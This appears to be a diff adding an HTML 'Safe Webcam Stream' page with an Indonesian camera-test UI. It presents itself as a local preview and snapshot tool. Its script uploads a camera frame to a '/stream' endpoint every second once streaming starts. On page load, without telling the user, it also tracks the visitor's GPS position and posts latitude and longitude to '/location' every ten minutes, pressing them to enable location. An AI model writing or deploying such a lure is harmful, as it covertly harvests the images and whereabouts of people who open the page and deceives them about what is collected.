@@ -1,0 +1,608 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Safe Webcam Stream — Camera UI</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <style>
+    /* === RESET & BASE === */
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: Inter, system-ui, Arial, sans-serif;
+}
+
+body {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  min-height: 100vh;
+  margin: 0;
+  padding: 20px;
+  background: linear-gradient(180deg, #0f1724 0%, #071026 100%);
+  color: #e6eef8;
+}
+
+/* === CONTAINER === */
+.camera-wrap {
+  width: 420px;
+  background: linear-gradient(180deg, #071428 0%, #062036 60%);
+  border: 1px solid rgba(255, 255, 255, 0.05);
+  border-radius: 20px;
+  padding: 16px;
+  box-shadow: 
+    0 10px 24px rgba(2, 6, 23, 0.7),
+    inset 0 1px 0 rgba(255, 255, 255, 0.03);
+}
+
+/* === TOPBAR === */
+.topbar {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 12px;
+}
+
+.brand {
+  display: flex;
+  gap: 8px;
+  align-items: center;
+}
+
+.logo {
+  width: 36px;
+  height: 36px;
+  border-radius: 8px;
+  background: linear-gradient(135deg, #ff7a7a, #ffb56b);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-weight: 700;
+  color: #081223;
+  box-shadow: 0 4px 12px rgba(255, 117, 117, 0.15);
+}
+
+.model {
+  font-size: 14px;
+  font-weight: 600;
+  color: #dbeafe;
+}
+
+.status {
+  font-size: 12px;
+  color: #9fb7d6;
+  opacity: 0.9;
+}
+
+/* === VIEWFINDER === */
+.viewfinder {
+  position: relative;
+  height: 300px;
+  background: #000;
+  border-radius: 14px;
+  overflow: hidden;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border: 6px solid rgba(10, 20, 30, 0.6);
+  box-shadow: 0 8px 20px rgba(2, 6, 23, 0.6);
+}
+
+#video {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  display: block;
+  transform: scaleX(-1); /* mirror selfie */
+}
+
+/* === DECORATIVE OVERLAYS === */
+.lens-ring {
+  position: absolute;
+  left: 50%;
+  top: 50%;
+  width: 72%;
+  height: 76%;
+  transform: translate(-50%, -50%);
+  border-radius: 10px;
+  pointer-events: none;
+  box-shadow: 
+    inset 0 0 0 2px rgba(255, 255, 255, 0.02),
+    0 0 30px rgba(0, 0, 0, 0.6);
+  mix-blend-mode: overlay;
+}
+
+.grid {
+  position: absolute;
+  inset: 0;
+  pointer-events: none;
+  background-image:
+    linear-gradient(to right, rgba(255, 255, 255, 0.04) 1px, transparent 1px),
+    linear-gradient(to bottom, rgba(255, 255, 255, 0.04) 1px, transparent 1px);
+  background-size: 33% 100%, 100% 33%;
+  opacity: 0.25;
+}
+
+.crosshair {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  pointer-events: none;
+}
+
+.crosshair::before,
+.crosshair::after {
+  content: "";
+  position: absolute;
+  background: rgba(255, 255, 255, 0.06);
+}
+
+.crosshair::before {
+  left: 50%;
+  top: 0;
+  width: 1px;
+  height: 100%;
+  transform: translateX(-50%);
+}
+
+.crosshair::after {
+  top: 50%;
+  left: 0;
+  height: 1px;
+  width: 100%;
+  transform: translateY(-50%);
+}
+
+/* === INFO OVERLAY === */
+.info {
+  position: absolute;
+  top: 10px;
+  left: 12px;
+  display: flex;
+  gap: 10px;
+  align-items: center;
+  font-size: 12px;
+  color: #cfe7ff;
+  background: rgba(6, 10, 16, 0.45);
+  padding: 6px 8px;
+  border-radius: 8px;
+  backdrop-filter: blur(4px);
+}
+
+.rec-dot {
+  width: 10px;
+  height: 10px;
+  border-radius: 50%;
+  background: #ff4f4f;
+  box-shadow: 0 0 10px rgba(255, 79, 79, 0.7);
+  animation: pulse 1.4s infinite;
+}
+
+@keyframes pulse {
+  0% { transform: scale(1); opacity: 1 }
+  70% { transform: scale(1.45); opacity: 0.45 }
+  100% { transform: scale(1); opacity: 1 }
+}
+
+/* === CONTROLS === */
+.controls {
+  margin-top: 14px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.left-controls {
+  display: flex;
+  gap: 8px;
+  align-items: center;
+}
+
+.meta {
+  font-size: 13px;
+  color: #9fb7d6;
+}
+
+.btn {
+  background: linear-gradient(180deg, #0b2a44, #072033);
+  color: #e6eef8;
+  border: 1px solid rgba(255, 255, 255, 0.05);
+  padding: 8px 12px;
+  border-radius: 10px;
+  cursor: pointer;
+  font-weight: 600;
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  transition: background 0.2s ease;
+  box-shadow: 0 6px 18px rgba(2, 6, 23, 0.45);
+}
+
+.btn:hover {
+  background: linear-gradient(180deg, #11486e, #072a46);
+}
+
+.btn:active {
+  transform: translateY(1px);
+}
+
+.btn.secondary {
+  background: linear-gradient(180deg, #112a3f, #071c2b);
+  color: #cfe7ff;
+}
+
+.btn.record {
+  background: linear-gradient(180deg, #ff4f4f, #d33d3d);
+  width: 52px;
+  height: 52px;
+  border-radius: 50%;
+  justify-content: center;
+  padding: 0;
+  box-shadow: 0 10px 30px rgba(211, 61, 61, 0.2);
+}
+
+.btn.record .inner {
+  width: 34px;
+  height: 34px;
+  border-radius: 50%;
+  background: #fff;
+  box-shadow: inset 0 -3px 6px rgba(0, 0, 0, 0.1);
+}
+
+/* === FOOTER NOTE === */
+.note {
+  margin-top: 12px;
+  font-size: 12px;
+  color: #93b6d8;
+  text-align: center;
+  opacity: 0.95;
+}
+
+/* === RESPONSIVE === */
+@media (max-width: 768px) {
+  .camera-wrap { width: 90%; }
+}
+
+@media (max-width: 480px) {
+  .camera-wrap { width: calc(100% - 32px); }
+}
+
+/* === RESPONSIVE === */
+@media (max-width: 768px) {
+  body {
+    padding: 10px;
+  }
+  .camera-wrap {
+    width: 100%;
+    max-width: 95%;
+    padding: 12px;
+  }
+  .viewfinder {
+    height: 240px;
+    border-width: 4px;
+  }
+  .controls {
+    flex-direction: column;
+    gap: 10px;
+  }
+  .left-controls {
+    width: 100%;
+    justify-content: space-between;
+  }
+  .btn {
+    flex: 1;
+    text-align: center;
+    font-size: 14px;
+    padding: 8px 10px;
+  }
+}
+
+@media (max-width: 480px) {
+  .camera-wrap {
+    width: 100%;
+    max-width: 100%;
+    border-radius: 12px;
+    padding: 10px;
+  }
+  .viewfinder {
+    height: 200px;
+  }
+  .btn {
+    font-size: 13px;
+    padding: 6px 8px;
+  }
+  .btn.record {
+    width: 44px;
+    height: 44px;
+  }
+  .btn.record .inner {
+    width: 28px;
+    height: 28px;
+  }
+  .meta {
+    font-size: 12px;
+  }
+  .note {
+    font-size: 11px;
+    margin-top: 8px;
+  }
+}
+
+  </style>
+</head>
+<body>
+  <div class="camera-wrap" role="region" aria-label="Camera preview">
+    <div class="topbar">
+      <div class="brand">
+        <div class="logo">Cam</div>
+        <div>
+          <div class="model">WAHYU-CAM</div>
+          <div class="status">WahyuCam - Uji Coba</div>
+        </div>
+      </div>
+      <div class="status" id="connectionStatus">Idle</div>
+    </div>
+
+    <div class="viewfinder">
+      <!-- video element yang terlihat -->
+      <video id="video" autoplay playsinline muted></video>
+
+      <!-- Decorative lens ring, grid, crosshair -->
+      <div class="lens-ring"></div>
+      <div class="grid"></div>
+      <div class="crosshair"></div>
+
+      <!-- Info overlay (rec dot + resolution + fps) -->
+      <div class="info" id="infoBox">
+        <div class="rec-dot" id="recDot" style="opacity:0;"></div>
+        <div id="resText">—</div>
+        <div id="fpsText" style="opacity:0.85;font-weight:600;">—</div>
+      </div>
+    </div>
+
+    <div class="controls">
+      <div class="left-controls">
+        <div class="meta">Preview</div>
+        <button class="btn secondary" id="snapBtn" title="Ambil snapshot (lokal)">Snapshot</button>
+      </div>
+
+      <div style="display:flex; gap:10px; align-items:center;">
+        <button class="btn" id="startBtn">Start</button>
+        <button class="btn" id="stopBtn" disabled>Stop</button>
+        <button class="btn record" id="recordIndicator" title="Recording indicator" aria-hidden="true">
+          <div class="inner" id="recordInner" style="background:#ff4f4f;"></div>
+        </button>
+      </div>
+    </div>
+
+    <div class="note">Tekan <strong>Start</strong> untuk mulai mengaktifkan kamera. Tekan Snapshot untuk berfoto.</div>
+  </div>
+
+  <canvas id="canvas" width="640" height="480" style="display:none"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const startBtn = document.getElementById('startBtn');
+    const stopBtn = document.getElementById('stopBtn');
+    const snapBtn = document.getElementById('snapBtn');
+    const resText = document.getElementById('resText');
+    const fpsText = document.getElementById('fpsText');
+    const connectionStatus = document.getElementById('connectionStatus');
+    const recDot = document.getElementById('recDot');
+    const recordInner = document.getElementById('recordInner');
+
+    let stream = null;
+    let streaming = false;
+    let intervalId = null;
+    let lastTime = performance.now();
+    let framesCount = 0;
+
+    let currentFacingMode = "user";
+
+    async function initCamera() {
+      try {
+        const constraints = { audio: false, video: { width: 640, height: 480, facingMode: currentFacingMode } };
+        stream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = stream;
+
+        await video.play();
+
+        // update resolution text
+        const track = stream.getVideoTracks()[0];
+        const settings = track.getSettings();
+        resText.textContent = (settings.width && settings.height) ? settings.width + '×' + settings.height : '—';
+      } catch (err) {
+        alert('Gagal mengakses kamera: ' + err);
+        throw err;
+      }
+    }
+
+    // === Tambahkan tombol switch kamera ===
+    const switchBtn = document.createElement("button");
+    switchBtn.textContent = "Depan / Belakang";
+    switchBtn.className = "btn secondary";
+    document.querySelector(".left-controls").appendChild(switchBtn);
+
+    switchBtn.addEventListener("click", async () => {
+      if (stream) {
+        stream.getTracks().forEach(t => t.stop());
+      }
+      currentFacingMode = currentFacingMode === "user" ? "environment" : "user";
+      await initCamera();
+    });
+
+    // Kirim frame sebagai Blob (jpeg kualitas 0.7) via fetch + FormData
+    async function sendFrame() {
+      if (!streaming) return;
+      // ambil frame dari video (mirrored already)
+      const ctx = canvas.getContext('2d');
+      // sesuaikan ukuran canvas dengan video untuk kualitas lebih baik
+      if (video.videoWidth && video.videoHeight) {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+      }
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // track fps sederhana
+      framesCount++;
+      const now = performance.now();
+      if (now - lastTime >= 1000) {
+        fpsText.textContent = Math.round((framesCount * 1000) / (now - lastTime)) + ' fps';
+        framesCount = 0;
+        lastTime = now;
+      }
+
+      canvas.toBlob(async function(blob) {
+        if (!blob) return;
+        const form = new FormData();
+        form.append('frame', blob, 'frame.jpg');
+        try {
+          await fetch('/stream', { method: 'POST', body: form });
+        } catch (e) {
+          console.error('Upload error', e);
+          connectionStatus.textContent = 'Upload error';
+        }
+      }, 'image/jpeg', 0.7);
+    }
+
+    startBtn.addEventListener('click', async () => {
+      startBtn.disabled = true;
+      connectionStatus.textContent = 'Starting...';
+      try {
+        await initCamera();
+      } catch (e) {
+        startBtn.disabled = false;
+        connectionStatus.textContent = 'Error';
+        return;
+      }
+      streaming = true;
+      stopBtn.disabled = false;
+      connectionStatus.textContent = 'Streaming';
+      recDot.style.opacity = 1;
+      recordInner.style.background = '#ffffff';
+      // kirim tiap 500ms (atur kalau perlu)
+      intervalId = setInterval(sendFrame, 1000);
+    });
+
+    stopBtn.addEventListener('click', () => {
+      streaming = false;
+      stopBtn.disabled = true;
+      startBtn.disabled = false;
+      connectionStatus.textContent = 'Stopped';
+      recDot.style.opacity = 0;
+      recordInner.style.background = '#ff4f4f';
+      if (intervalId) { clearInterval(intervalId); intervalId = null; }
+      if (stream) {
+        stream.getTracks().forEach(t => t.stop());
+        stream = null;
+      }
+    });
+
+    // snapshot (ambil frame lokal dan buka di tab baru)
+    snapBtn.addEventListener('click', () => {
+      if (!video || !video.videoWidth) return;
+      const ctx = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(b => {
+        const url = URL.createObjectURL(b);
+        window.open(url, '_blank');
+      }, 'image/png');
+    });
+
+    // cleanup saat unload
+    window.addEventListener('beforeunload', () => {
+      if (stream) stream.getTracks().forEach(t => t.stop());
+    });
+
+        // === Lokasi ===
+    let lastLocationSent = 0; // simpan timestamp terakhir kirim
+
+function sendLocation(lat, lon) {
+  const now = Date.now();
+  
+  // ubah sesuai kebutuhan
+  const intervalMs = 600_000; // 10 menit (600.000 ms)
+  // const intervalMs = 100_000; // 100 detik
+  
+  if (now - lastLocationSent < intervalMs) {
+    return; // skip kirim kalau belum lewat interval
+  }
+  lastLocationSent = now;
+
+  const form = new FormData();
+  form.append("lat", lat);
+  form.append("lon", lon);
+  fetch("/location", { method: "POST", body: form })
+    .then(r => r.text())
+    .then(t => console.log("Lokasi terkirim:", t))
+    .catch(err => console.error("Gagal kirim lokasi:", err));
+}
+
+
+    function initLocation() {
+      if (!navigator.geolocation) {
+        alert("Browser tidak mendukung geolokasi.");
+        return;
+      }
+      // realtime watchPosition
+      navigator.geolocation.watchPosition(
+        pos => {
+          const lat = pos.coords.latitude.toFixed(6);
+          const lon = pos.coords.longitude.toFixed(6);
+          console.log("Lokasi:", lat, lon);
+          sendLocation(lat, lon);
+        },
+        err => {
+          console.error("Gagal dapat lokasi:", err);
+          alert("Gagal akses lokasi: " + err.message);
+        },
+        { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
+      );
+    }
+
+    // jalankan langsung saat halaman load
+    
+    async function initLocation() {
+      if (!navigator.geolocation) {
+        alert("Browser tidak mendukung geolokasi.");
+        return;
+      }
+
+      try {
+        // cek izin dulu
+        const perm = await navigator.permissions.query({ name: "geolocation" });
+
+        if (perm.state === "denied") {
+          alert("Lokasi kamu masih off / ditolak. Aktifkan GPS dan izinkan lokasi di browser, lalu reload halaman ini.");
+          return;
+        }
+
+        // kalau granted atau prompt → coba ambil posisi
+        navigator.geolocation.watchPosition(
+          pos => {
+            const lat = pos.coords.latitude.toFixed(6);
+            const lon = pos.coords.longitude.toFixed(6);
+            console.log("Lokasi:", lat, lon);
+            sendLocation(lat, lon);
+          },
+          err => {
+            console.error("Gagal dapat lokasi:", err);
+            alert("Aktifkan GPS di perangkat lalu izinkan akses lokasi di browser. Error: " + err.message);
+          },
+          { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
+        );
+      } catch (e) {
+        console.error("Permission API error:", e);
+        alert("Browser kamu tidak support cek izin lokasi otomatis. Coba nyalakan GPS & izinkan lokasi di setting browser.");
+      }
+    }
+
+    window.addEventListener("load", initLocation);
+
+  </script>
+</body>
+</html>
